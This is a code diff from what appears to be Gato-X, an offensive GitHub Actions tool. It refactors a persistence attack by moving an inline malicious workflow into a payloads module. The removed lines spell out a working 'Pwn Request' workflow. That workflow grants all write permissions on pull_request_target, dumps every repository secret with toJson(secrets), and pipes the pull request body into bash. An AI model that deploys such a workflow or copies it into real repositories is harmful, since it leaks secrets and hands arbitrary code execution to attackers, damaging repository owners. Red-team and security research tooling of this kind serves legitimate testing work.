@@ -19,6 +19,7 @@ from cryptography.hazmat.primitives import serialization
 from cryptography.hazmat.primitives.asymmetric import rsa
 
 from gatox.attack.attack import Attacker
+from gatox.attack.payloads.payloads import Payloads
 from gatox.cli.output import Output
 
 logger = logging.getLogger(__name__)
@@ -134,42 +135,8 @@ class PersistenceAttack(Attacker):
             f"Creating malicious pull_request_target workflow on {target_repo}:{branch_name}"
         )
 
-        # Malicious workflow content
-        workflow_content = f"""name: Pwn Request Workflow
-on:
-  pull_request_target:
-    branches: [{branch_name}]
-
-permissions:
-  contents: write
-  pull-requests: write
-  actions: write
-  checks: write
-  deployments: write
-  issues: write
-  packages: write
-  pages: write
-  repository-projects: write
-  security-events: write
-  statuses: write
-
-jobs:
-  pwn:
-    runs-on: ubuntu-latest
-    steps:
-      - name: Checkout PR
-        uses: actions/checkout@v4
-        with:
-          ref: ${{{{ github.event.pull_request.head.sha }}}}
-          
-      - name: Execute Payload
-        run: |
-          echo "All secrets:"
-          echo '${{{{ toJson(secrets) }}}}'
-          
-          # Execute any code from PR body
-          echo "${{{{ github.event.pull_request.body }}}}" | bash
-"""
+        # Get workflow content from payloads
+        workflow_content = Payloads.PWN_REQUEST_WORKFLOW.format(branch_name)
 
         result = await self.api.create_workflow_on_branch(
             target_repo,
